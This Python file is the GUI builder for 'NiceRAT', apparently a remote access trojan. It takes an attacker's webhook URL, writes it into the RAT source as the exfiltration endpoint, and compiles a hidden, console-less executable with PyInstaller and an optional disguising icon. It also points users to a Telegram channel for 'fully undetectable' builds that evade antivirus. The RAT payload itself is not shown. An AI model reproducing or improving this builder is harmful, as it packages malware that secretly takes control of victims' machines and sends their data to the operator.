import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
import requests
from threading import Thread
from PIL import Image



ctk.set_appearance_mode("light")
app = ctk.CTk()
app.title(f"NiceRAT")
app.iconbitmap("img\\Nice.ico")
app.geometry("450x450")
app.resizable(False, False)
app.configure(background='#F9FAF8')


app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'NiceRAT.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def checkbox_event():
    print("checkbox toggled, current value:", check_var.get())

def add_icon():
    if check_var.get() == "on":
        return True
    else:
        return False

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ""


        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - https://t.me/NicestRAT"
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller NiceRAT.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

def open_telegram_link(event):
    import webbrowser
    webbrowser.open('https://t.me/NicestRAT')

def open_web_link(event):
    import webbrowser
    webbrowser.open('https://www.nicerat.com')

def open_github_link(event):
    import webbrowser
    webbrowser.open('https://github.com/0x00G/NiceRAT')

def toggle_password_visibility(event):
    if entry.cget('show') == '*':
        entry.configure(show='')
        password.configure(light_image=Image.open(os.path.join("img\\hide.png")))
    else:
        entry.configure(show='*')
        password.configure(light_image=Image.open(os.path.join("img\\show.png")))



bg = ctk.CTkImage(light_image=Image.open(os.path.join("img\\bg.png")), size=(450 , 450))
label = ctk.CTkLabel(master=app, image=bg, text='', fg_color="#F8F8F8")
label.place(relx=0.5, rely=0.5, anchor=ctk.CENTER)

password = ctk.CTkImage(light_image=Image.open(os.path.join("img\\show.png")), size=(25 , 25))
label = ctk.CTkLabel(master=app, image=password, text='',  fg_color="#F8F8F8")
label.place(relx=0.83, rely=0.35, anchor=ctk.CENTER)
label.bind("<Button-1>", toggle_password_visibility)

telegram = ctk.CTkImage(light_image=Image.open(os.path.join("img\\telegram.png")), size=(25 , 25))
label = ctk.CTkLabel(master=app, image=telegram, text='',  fg_color="#F8F8F8")
label.place(relx=0.3, rely=0.8, anchor=ctk.CENTER)
label.bind("<Button-1>", open_telegram_link)

telegram = ctk.CTkImage(light_image=Image.open(os.path.join("img\\web.png")), size=(25 , 25))
label = ctk.CTkLabel(master=app, image=telegram, text='',  fg_color="#F8F8F8")
label.place(relx=0.5, rely=0.8, anchor=ctk.CENTER)
label.bind("<Button-1>", open_web_link)

telegram = ctk.CTkImage(light_image=Image.open(os.path.join("img\\github.png")), size=(25 , 25))
label = ctk.CTkLabel(master=app, image=telegram, text='',  fg_color="#F8F8F8")
label.place(relx=0.7, rely=0.8, anchor=ctk.CENTER)
label.bind("<Button-1>", open_github_link)

check_var = ctk.StringVar(value="on")
checkbox = ctk.CTkCheckBox(master=app, text='', command=checkbox_event,
                                     variable=check_var, onvalue="on", offvalue="off", width=10, height=10, bg_color="#F8F8F8")
checkbox.place(relx=0.7, rely=0.62, anchor=ctk.CENTER)




entry = ctk.CTkEntry(master=app, width=250, height=30, border_color="#E2E8F0", border_width=1, fg_color="#FFFFFF", placeholder_text="Enter your webhook", corner_radius=5, justify='center', show='*')
entry.place(relx=0.5, rely=0.35, anchor=ctk.CENTER)


button = ctk.CTkButton(master=app, text="Build",  text_color="#F9FAF8", border_color="#e5e7eb", border_width=0, hover_color="#6FA5D8", fg_color="#5898D4", corner_radius=5, command=build_exe)
button.place(relx=0.5, rely=0.45, anchor=ctk.CENTER)



app.mainloop()
